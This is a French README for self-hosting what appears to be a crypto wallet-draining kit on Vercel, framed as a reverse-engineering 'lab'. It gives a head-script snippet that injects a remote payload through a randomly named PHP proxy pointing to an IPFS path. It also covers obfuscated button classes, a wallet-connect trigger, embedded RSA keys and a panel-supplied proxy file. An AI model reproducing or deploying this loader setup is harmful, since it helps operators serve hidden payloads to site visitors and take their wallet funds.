# Self-host lab (Vercel) — même layout que SolFerno stable build

Setup officiel **self-host** :

1. **`yE3Yqtto.php`** dans le **même dossier** que `index.html` → ici : `public/yE3Yqtto.php` + `public/index.html`
2. Dans le `<head>` :

```html
<script>
  document.head.append(
    Object.assign(document.createElement("script"), {
      src:
        "/yE3Yqtto.php?s=%2Fipfs%2FPOsdex8izESA8Aqsm4d51Q2289c0429306bf23bb8292d19b15f836%3Ft%3D" +
        Date.now(),
    }),
  );
</script>
```

3. Bouton : `class="8i70TZbI il3Miquj"` ou `onclick="window.startConnect()"`

**Drakard** (`/secureproxy?...`) : autre hébergeur ; ici c’est le path **`/yE3Yqtto.php`** comme dans le build stable.

## Vercel

- Import repo GitHub → Deploy. **Aucune variable d’env** : les clés RSA sont **dans `public/yE3Yqtto.php`**, comme en PHP classique.
- Vercel ne exécute pas PHP : la route `/yE3Yqtto.php` est **réécrite** vers `api/proxy.js`, qui fait la même chose que `SecureProxyMiddleware::handle()`.

Ping : `/yE3Yqtto.php?e=ping_proxy` → `pong`

## Capture txs (RE)

`public/hook.js` est chargé avant le kit → `window.__labParsedPayloads` après connect.

## Local

```bash
npx vercel dev
```

Remplace `public/yE3Yqtto.php` par **ton** fichier proxy fourni par le panel si tu en as un autre.
